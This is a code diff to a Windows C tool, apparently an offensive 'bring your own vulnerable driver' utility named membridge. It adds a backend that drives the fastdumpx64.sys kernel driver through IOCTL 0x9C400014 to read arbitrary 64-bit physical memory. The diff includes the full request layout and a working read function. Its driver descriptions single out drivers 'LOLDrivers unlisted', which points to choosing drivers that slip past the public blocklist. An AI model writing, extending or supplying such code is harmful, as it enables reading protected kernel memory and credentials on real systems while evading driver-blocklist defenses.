@@ -25,7 +25,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -84,6 +84,9 @@ static const backend_t g_backends[] = {
     { L"gibepext", L"drivers\\gibepext\\gibepext.sys",
       BK_CONTROL, L"MembridgeGibepExt", L"\\\\.\\GibEpExt", LY_GIBEPEXT, 1,
       L"gibepext.sys (GIGABYTE EP firmware/forensic; CRC32-gated IOCTL_READ_PHYSMEM 0x22E00C, arbitrary 64-bit PA; LOLDrivers unlisted)" },
+    { L"fastdumpx64", L"drivers\\fastdumpx64\\fastdumpx64.sys",
+      BK_CONTROL, L"MembridgeFastDump", L"\\\\.\\FastDump", LY_FASTDUMP, 1,
+      L"fastdumpx64.sys 2.3.0.92 (LOLDrivers unlisted; IOCTL 0x9C400014: u64 PA + u32 size, data at output+0x34, arbitrary 64-bit PA read)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -117,6 +120,7 @@ static const char *layout_name(layout_t l) {
     case LY_ENEIO_MAP: return "eneio64";
     case LY_GLCKIO2_MAP: return "glckio2";
     case LY_GIBEPEXT: return "gibepext";
+    case LY_FASTDUMP: return "fastdump";
     }
     return "?";
 }
@@ -642,6 +646,26 @@ static int read_gibepext(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
     return 1;
 }
 
+// fastdumpx64 (FastDump dump driver): IOCTL 0x9C400014.
+// Input 20B: {u32 status; u64 physical_address; u32 size}; output buffer must be >= 0x1034,
+// mapped physical data is copied at output offset 0x34.
+static int read_fastdump(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint8_t in[20];
+    DWORD ret = 0;
+    uint32_t outLen = 0x34 + size;
+    if (outLen < 0x1034) outLen = 0x1034;
+    uint8_t *buf = (uint8_t *)calloc(1, outLen);
+    if (!buf) return 0;
+    memset(in, 0, sizeof(in));
+    *(uint64_t *)(in + 8) = pa;
+    *(uint32_t *)(in + 16) = size;
+    BOOL ok = DeviceIoControl(dev, 0x9C400014u, in, sizeof(in), buf, outLen, &ret, NULL);
+    if (ok) memcpy(out, buf + 0x34, size);
+    else wprintf(L"[ERR] fastdumpx64 IOCTL 0x9C400014 err=%lu\n", GetLastError());
+    free(buf);
+    return ok ? 1 : 0;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -654,6 +678,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_ENEIO_MAP: return read_eneio_map(dev, pa, size, out);
     case LY_GLCKIO2_MAP: return read_glckio2_map(dev, pa, size, out);
     case LY_GIBEPEXT: return read_gibepext(dev, pa, size, out);
+    case LY_FASTDUMP: return read_fastdump(dev, pa, size, out);
     }
     return 0;
 }
@@ -695,7 +720,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -747,6 +772,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"eneio64") == 0 || _wcsicmp(layout, L"eneio") == 0) g_manual_layout = LY_ENEIO_MAP;
         else if (_wcsicmp(layout, L"glckio2") == 0 || _wcsicmp(layout, L"glckio") == 0) g_manual_layout = LY_GLCKIO2_MAP;
         else if (_wcsicmp(layout, L"gibepext") == 0) g_manual_layout = LY_GIBEPEXT;
+        else if (_wcsicmp(layout, L"fastdump") == 0 || _wcsicmp(layout, L"fastdumpx64") == 0) g_manual_layout = LY_FASTDUMP;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
